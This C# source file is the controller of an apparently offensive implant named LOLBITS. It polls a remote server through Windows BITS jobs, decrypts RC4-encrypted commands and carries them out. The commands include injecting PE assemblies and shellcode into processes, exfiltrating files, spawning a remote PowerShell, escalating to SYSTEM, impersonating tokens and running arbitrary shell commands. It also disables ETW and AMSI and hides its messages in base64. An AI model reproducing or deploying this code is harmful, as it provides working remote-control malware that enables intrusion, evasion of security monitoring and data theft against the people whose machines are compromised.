﻿using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Text;
using System.Threading;
using LOLBITS.Loading;
using LOLBITS.Protection;
using LOLBITS.TokenManagement;
using Newtonsoft.Json;
using BITS = BITSReference2_5;

namespace LOLBITS.Controlling
{
    public class Controller
    {
        private const string _contId = "7061796c676164";
        private readonly string _p;
        private string _id;
        private string _auth;
        private string[] _restoreKeys;
        private readonly string _tempPath;
        private readonly TokenManager _tokenManager;
        private readonly Jobs _jobsManager;
        private readonly HookManager _hookManager;
        private readonly SysCallManager _sysCall;

        public Controller(string id, string url,string password)
        {
            _id = id;
            _p = password;
            _jobsManager = new Jobs(url);
            _sysCall = new SysCallManager();
            _tokenManager = new TokenManager(_sysCall);
            _hookManager = new HookManager(_sysCall);
            _tempPath = Environment.GetEnvironmentVariable("temp") ?? @"C:\Windows\Temp\";
        }

        public string GetPassword()
        {
            return _p;
        }

        public void hookLdr()
        {
            _hookManager.Install();
        }

        public void Start()
        {

            string startBits = Encoding.UTF8.GetString(Convert.FromBase64String("c2Mgc3RhcnQgQklUUw=="));
            Utils.ExecuteCommand(startBits, _sysCall);
            Thread.Sleep(500);
            var filePath = _tempPath + @"\" + _id;

            if (!TryInitialCon(filePath)) return;

            var file = GetEncryptedFileContent(filePath, out var unused);
            _id = file.NextId;
            _auth = file.NextAuth;
            _restoreKeys = file.Commands; 
            var domain = Environment.GetEnvironmentVariable("userdomain");
            var user = Environment.GetEnvironmentVariable("username");
            var response = new Response(domain + @"\" + user, _auth);
            filePath = _tempPath + @"\" + _id + ".txt";
            EncryptResponseIntoFile(filePath, response);

            _jobsManager.Send(_id, filePath);

            Utils.handleETW(_sysCall, _hookManager);
            Utils.handleAM(_sysCall, _hookManager);


            Loop();
                
        }

        private void Loop()
        {
            var exit = false;
            while (!exit)
            {
                var filePath = _tempPath + @"\" + _id;
                var headers = "reqId: " + _auth;

                Console.WriteLine("next: " + _id);

                if (_jobsManager.Get(_id, filePath, headers, BITS.BG_JOB_PRIORITY.BG_JOB_PRIORITY_NORMAL))
                {
                    var file = GetEncryptedFileContent(filePath, out var unused);

                    _id = file.NextId;
                    _auth = file.NextAuth;
                    Console.WriteLine("Id: " + _id);
                    Console.WriteLine("Auth: " + _auth);

                    if (file.Commands.Length > 0)
                        DoSomething(file);
                    
                    Thread.Sleep(1000);
                }
                else
                {
                    if (_restoreKeys.Length > 0)
                    {
                        _auth = _restoreKeys[_restoreKeys.Length - 1];
                        Array.Resize(ref _restoreKeys,_restoreKeys.Length - 1);
                    }
                    else
                        exit = true;
                }
            }
        }

        private void DoSomething(Content file)
        {
            var rps = "";

            try
            {
                switch (file.Commands[0])
                {
                    case "inject_pe":
                        {
                            var fileP = _tempPath + @"\" + _id;
                            var headers = "reqId: " + _auth + "\r\ncontid: " + _contId;

                            if (_jobsManager.Get(_id, fileP, headers, BITS.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
                            {
                                try
                                {
                                    var pe = LoadPE(fileP);
                                    var method = file.Commands[1];
                                    var args = "";

                                    for (var i = 2; i < file.Commands.Length; i++)
                                    {
                                        args += file.Commands[i];
                                        if (i < file.Commands.Length)
                                            args += " ";
                                    }

                                    var arguments = new string[] { args };

                                    LauncherPE.Main(method, arguments, pe);
                                    rps = Encoding.UTF8.GetString(Convert.FromBase64String("UEUgaW5qZWN0ZWQh"));
                                }
                                catch (Exception)
                                {
                                    rps = Encoding.UTF8.GetString(Convert.FromBase64String("RVJSOkZhdGFsIGVycm9yIG9jY3VycmVkIHdoaWxlIHRyeWluZyB0byBpbmplY3QgdGhlIGRsbC4="));
                                }
                            }
                            else
                            {
                                rps = Encoding.UTF8.GetString(Convert.FromBase64String("RVJSOkRsbCBub3QgZm91bmQh"));
                            }

                            break;
                        }

                    case "inject_shellcode":
                        {
                            var fileP = _tempPath + @"\" + _id;
                            var headers = "reqId: " + _auth + "\r\ncontid: " + _contId;
                            var pid = -1;
                            if (file.Commands.Length >= 2)
                                pid = int.Parse(file.Commands[1]);

                            if (_jobsManager.Get(_id, fileP, headers, BITS.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
                            {
                                byte[] sh;
                                GetEncryptedFileContent(fileP, out sh);

                                try
                                {
                                    LauncherShellCode.Main(sh, _sysCall, pid);
                                    rps = Encoding.UTF8.GetString(Convert.FromBase64String("U2hlbGxjb2RlIGluamVjdGVkIQ=="));
                                }
                                catch (Exception)
                                {
                                    rps = Encoding.UTF8.GetString(Convert.FromBase64String("RVJSOkZhdGFsIGVycm9yIG9jY3VycmVkIHdoaWxlIHRyeWluZyB0byBpbmplY3QgdGhlIHNoZWxsY29kZS4="));
                                }
                            }
                            else
                            {
                                rps = Encoding.UTF8.GetString(Convert.FromBase64String("RVJSOlNoZWxsY29kZSBmaWxlIG5vdCBmb3VuZCE="));
                            }

                            break;
                        }

                    case "powershell":
                        {
                            rps = Utils.ExecuteCommand(Encoding.UTF8.GetString(Convert.FromBase64String("cG93ZXJzaGVsbCAtViAyIC9DIFdyaXRlLUhvc3QgaGk=")), _sysCall);

                            if (rps.Contains("hi"))
                            {
                                LauncherPowershell.Main(file.Commands[1], file.Commands[2]);
                                rps = Encoding.UTF8.GetString(Convert.FromBase64String("WW91IHNob3VsZCBoYXZlIHlvdXIgUG93ZXJzaGVsbCBhdCA=")) + file.Commands[1] + ":" + file.Commands[2] + "!\n";
                            }
                            else
                            {
                                rps = Encoding.UTF8.GetString(Convert.FromBase64String(
                                    "VmVyc2lvbiAyIG9mIFBvd2Vyc2hlbGwgbm90IGF2YWlsYWJsZS4gVHJ5IGluamVjdGluZyB" +
                                    "FdmlsU2Fsc2EgYnkgQ3liZXJWYWNhIGluIG9yZGVyIHRvIHVzZSBwb3dlcnNoZWxsIHdpdGhvdXQgYW0=")) + "si.\n";
                            }

                            break;
                        }

                    case "send":
                        {
                            var fileP = _tempPath + @"\" + _id;
                            var headers = "reqId: " + _auth + "\r\ncontid: " + _contId;

                            if (_jobsManager.Get(_id, fileP, headers, BITS.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
                            {
                                File.Copy(fileP, file.Commands[1], true);
                                rps = Encoding.UTF8.GetString(Convert.FromBase64String("RG93bG9hZCBmaW5pc2hlZC4="));
                            }
                            else
                            {
                                rps = Encoding.UTF8.GetString(Convert.FromBase64String("RVJSOkRvd25sb2FkIGZhaWxlZCE="));
                            }

                            break;
                        }
                    case "exfiltrate":
                        {
                            if (File.Exists(file.Commands[1]))
                            {
                                if (_jobsManager.Send(file.Commands[2], file.Commands[1]))
                                {
                                    rps = Encoding.UTF8.GetString(Convert.FromBase64String("RXhmaWx0cmF0aW9uIHN1Y2NlZWQu"));

                                }
                                else
                                    rps = Encoding.UTF8.GetString(Convert.FromBase64String("RVJSOkV4ZmlsdHJhdGlvbiBmYWlsZWQh"));
                            }
                            else
                                rps = Encoding.UTF8.GetString(Convert.FromBase64String("RVJSOkZpbGUgdG8gZXhmaWx0cmF0ZSBub3QgZm91bmQh"));

                            break;
                        }
                    case "getsystem":
                        {
                            if (Utils.IsHighIntegrity(_sysCall))
                                rps = _tokenManager.GetSystem(_sysCall) ? Encoding.UTF8.GetString(Convert.FromBase64String("V2UgYXJlIFN5c3RlbSE=")) :
                                                                          Encoding.UTF8.GetString(Convert.FromBase64String("V2UgYXJlIFN5c3RlbSFcbkVS" +
                                                                          "UjpQcm9jZXNzIGZhaWxlZCEgSXMgdGhpcyBwcm9jZXNzIHJ1bm5pbmcgd2l0aCBoaWdoIGludGVncml0eSBsZXZlbD8="));
                            else
                                rps = Encoding.UTF8.GetString(Convert.FromBase64String("RVJSOlByb2Nlc3MgZmFpbGVkISBJcyB0aGlzIHByb2Nlc3MgcnVubmluZyB3aXRoIGhpZ2ggaW50ZWdyaXR5IGxldmVsPw=="));

                            break;
                        }

                    case "rev2self":
                        {
                            TokenManager.Rev2Self();
                            rps = "Welcome back.\n";

                            break;
                        }

                    case "runas":
                        {
                            string user = "", domain = "", password = "";
                            var userData = file.Commands[1].Split('\\');

                            if (userData.Length == 1)
                            {
                                domain = ".";
                                user = userData[0];
                            }
                            else
                            {
                                domain = userData[0];
                                user = userData[1];
                            }

                            password = file.Commands[2];

                            rps = TokenManager.RunAs(domain, user, password) ? "Success!" : Encoding.UTF8.GetString(Convert.FromBase64String("RVJSOkludmFsaWQgY3JlZGVudGlhbHMu"));

                            break;
                        }

                    case "list":
                        {
                            rps = GetProcessInfo();
                            break;
                        }

                    case "impersonate":
                        {
                            try
                            {
                                if (_tokenManager.Impersonate(int.Parse(file.Commands[1]), _sysCall))
                                    rps = Encoding.UTF8.GetString(Convert.FromBase64String("SW1wZXJzb25hdGlvbiBhY2hpZXZlZCE="));
                                else
                                    rps = Encoding.UTF8.GetString(Convert.FromBase64String("RVJSOiBOb3QgZW5vdWdoIHByaXZpbGVnZXMh"));
                            }
                            catch
                            {
                                rps = Encoding.UTF8.GetString(Convert.FromBase64String("RVJSOiBJbXBlcnNvbmF0aW9uIGZhaWxlZCE="));
                            }

                            break;
                        }

                    case "exit":
                        {
                            Environment.Exit(0);
                            break;
                        }

                    default:
                        {
                            rps = Utils.ExecuteCommand(file.Commands[0], _sysCall);
                            break;
                        }
                }
            } 
            catch
            {
                rps = Encoding.UTF8.GetString(Convert.FromBase64String("RVJSOiBTb21ldGhpbmcgd2VudCB3cm9uZyE="));
            }

            var response = new Response(rps, _auth);
            var filePath = _tempPath + @"\" + _id + ".txt";
            EncryptResponseIntoFile(filePath, response);
            TrySend(filePath);
        }

        private  string GetProcessInfo()
        {
            var output = "\n";
            output = string.Concat(output, $"{"NAME",40}|{"PID",10}|{"ACCOUNT",40}|\n");
            var cmd = Encoding.UTF8.GetString(Convert.FromBase64String("dGFza2xpc3QgL3YgL2ZvIGNzdg=="));

            var o = Utils.ExecuteCommand(cmd, _sysCall);
            var spl = o.Split('\n');
            spl = spl.Skip(1).ToArray();

            foreach (var r in spl)
            {
                var s = r.Split(',');
                if (s.Length >= 6)
                {

                    var name = s[0].Replace("\"","");
                    var processId = s[1].Replace("\"", ""); ;
                    var owner = s[6].Replace("\"", ""); ;
                    output = string.Concat(output, $"{name,40}|{processId,10}|{owner,40}|\n");
                }
            }

            return output;
        }

        private static string GetProcessOwner (int processId)
        {
            var query = Encoding.UTF8.GetString(Convert.FromBase64String("U2VsZWN0ICogRnJvbSBXaW4zMl9Qcm9jZXNzIFdoZXJlIFByb2Nlc3NJRCA9IA==")) + processId;
            var moSearcher = new ManagementObjectSearcher(query);
            var moCollection = moSearcher.Get();

            foreach (var o in moCollection)
            {
                var mo = (ManagementObject) o;
                var args = new string[] { string.Empty };
                var returnVal = Convert.ToInt32(mo.InvokeMethod("GetOwner", args));
                if (returnVal == 0)
                    return args[0];
            }

            return "UNKNOWN";
        }
        private bool TrySend(string filePath)
        {
            var cont = 0;

            while (cont < 5)
            {
                if (_jobsManager.Send(_id, filePath))
                    return true;

                ++cont;
            }

            return false;
        }

        private bool TryInitialCon(string filePath)
        {
            var cont = 0;
            while (cont < 5)
            {
                if(_jobsManager.Get(_id, filePath, null,BITS.BG_JOB_PRIORITY.BG_JOB_PRIORITY_NORMAL))
                    return true;

                ++cont;
            }

            return false;
        }

        private void EncryptResponseIntoFile(string filePath, Response response)
        {
            var jsonResponse = JsonConvert.SerializeObject(response);
            var contentDecrypted = Encoding.UTF8.GetBytes(jsonResponse);
            var xKey = Encoding.ASCII.GetBytes(_p);
            var contentEncrypted = Rc4.Encrypt(xKey, contentDecrypted);
            var hexadecimal = BiteArrayToHex.Convert(contentEncrypted);
            var fileContent = Zipper.Compress(hexadecimal);

            File.WriteAllText(filePath, fileContent);
        }

        private Content GetEncryptedFileContent(string filePath, out byte[] decrypted)
        {
            var fileStr = File.ReadAllText(filePath);
            var xKey = Encoding.ASCII.GetBytes(_p);
            var hexadecimal = Zipper.Decompress(fileStr);
            var contentEncrypted = StringHexToByteArray.Convert(hexadecimal); 
            var contentDecrypted = Rc4.Decrypt(xKey, contentEncrypted);

            decrypted = contentDecrypted;

            var contentEncoded = Encoding.UTF8.GetString(contentDecrypted);

            try
            {
                var final = JsonConvert.DeserializeObject<Content>(contentEncoded);
                return final;
            }
            catch
            {
                return null;
            }
        }

        private Assembly LoadPE(string filePath)
        {
            var fileStr = File.ReadAllText(filePath);
            var xKey = Encoding.ASCII.GetBytes(_p);
            var hexadecimal = Zipper.Decompress(fileStr);
            var contentEncrypted = StringHexToByteArray.Convert(hexadecimal);
            var contentDecrypted = Rc4.Decrypt(xKey, contentEncrypted);

            var pe = Assembly.Load(contentDecrypted);

            return pe;
        }
    }
}